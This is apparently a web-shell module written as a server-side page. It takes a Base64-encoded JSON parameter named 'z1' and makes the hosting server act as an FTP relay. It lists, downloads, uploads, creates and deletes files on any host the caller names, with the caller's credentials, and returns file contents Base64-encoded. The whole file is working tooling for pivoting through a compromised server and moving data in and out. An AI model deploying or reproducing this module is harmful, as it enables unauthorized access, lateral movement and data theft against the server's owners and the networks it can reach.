<%
(function() {
    var URL = Java.type("java.net.URL");
    var BufferedReader = Java.type("java.io.BufferedReader");
    var InputStreamReader = Java.type("java.io.InputStreamReader");
    var InputStream = Java.type("java.io.InputStream");
    var OutputStream = Java.type("java.io.OutputStream");
    var ByteArrayOutputStream = Java.type("java.io.ByteArrayOutputStream");
    var Base64 = Java.type("java.util.Base64");
    var StandardCharsets = Java.type("java.nio.charset.StandardCharsets");

    function fnExtractJsonValue(json, key) {
        var pattern = "\"" + key + "\"\\s*:\\s*\"?([^\",}]+)\"?";
        var matcher = java.util.regex.Pattern.compile(pattern).matcher(json);
        if (matcher.find()) {
            return matcher.group(1).trim();
        }
        return "";
    }

    function handle_ftp(ip, port, user, pass, action, remotePath, timeout, rawJson) {
        try {
            if (!remotePath || remotePath === "") {
                remotePath = "/";
            }
            var userInfo = (user && user !== "") ? user + ":" + (pass ? pass : "") + "@" : "";
            var uriString = "ftp://" + userInfo + ip + ":" + port + remotePath;

            var url = new URL(uriString);
            var conn = url.openConnection();

            var timeoutMs = timeout > 0 ? timeout * 1000 : 10000;
            conn.setConnectTimeout(timeoutMs);
            conn.setReadTimeout(timeoutMs);

            var lowerAction = (action ? action : "list").toLowerCase();

            if (lowerAction === "list") {
                var reader = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8));
                var content = "";
                var line;
                while ((line = reader.readLine()) !== null) {
                    content += line + "\n";
                }
                reader.close();
                return "[+] SUCCESS_LIST\n" + content.trim();

            } else if (lowerAction === "mkdir" || lowerAction === "delete") {
                var inStream = conn.getInputStream();
                inStream.close();
                return "[+] SUCCESS_" + lowerAction.toUpperCase() + " -> Operation completed: " + remotePath;

            } else if (lowerAction === "download" || lowerAction === "read") {
                var responseStream = conn.getInputStream();
                var memoryStream = new ByteArrayOutputStream();
                var buffer = java.lang.reflect.Array.newInstance(Java.type("byte"), 8192);
                var bytesRead;
                while ((bytesRead = responseStream.read(buffer)) !== -1) {
                    memoryStream.write(buffer, 0, bytesRead);
                }
                responseStream.close();
                var fileBytes = memoryStream.toByteArray();
                var base64Data = Base64.getEncoder().encodeToString(fileBytes);
                return "[+] SUCCESS_DOWNLOAD\n" + base64Data;

            } else if (lowerAction === "upload") {
                var fileContentBase64 = fnExtractJsonValue(rawJson, "content");
                if (!fileContentBase64 || fileContentBase64 === "") {
                    return "[-] Failed to upload: File content is empty.";
                }

                var fileBytes = Base64.getDecoder().decode(fileContentBase64);
                conn.setDoOutput(true);

                var requestStream = conn.getOutputStream();
                requestStream.write(fileBytes, 0, fileBytes.length);
                requestStream.flush();
                requestStream.close();

                var inStream = conn.getInputStream();
                inStream.close();
                return "[+] SUCCESS_UPLOAD -> File uploaded successfully: " + remotePath;

            } else {
                return "[-] ERROR: Unknown FTP action: " + lowerAction;
            }

        } catch (e) {
            return "[-] FTP error: " + e.toString();
        }
    }

    function main() {
        var z1 = request.getParameter("z1");
        if (!z1) {
            out.print("[-] Missing parameter z1.");
            return;
        }

        try {
            var jsonStr = z1;
            try {
                var decodedBytes = Base64.getDecoder().decode(z1);
                jsonStr = new java.lang.String(decodedBytes, StandardCharsets.UTF_8);
            } catch (err) {
                
            }

            var config = JSON.parse(jsonStr);

            var ip = config.ip || "127.0.0.1";
            var port = config.port ? parseInt(config.port, 10) : 21;
            var user = config.user || "";
            var pass = config.pass || "";
            var action = config.action || "list";
            var remotePath = config.path || config.query || "/";
            var timeout = config.timeout ? parseInt(config.timeout, 10) : 10;

            var result = handle_ftp(ip, port, user, pass, action, remotePath, timeout, jsonStr);

            out.print(result);

        } catch (e) {
            out.print("[-] Invalid JSON / Base64 or execution error: " + e.toString());
        }
    }

    main();
})();
%>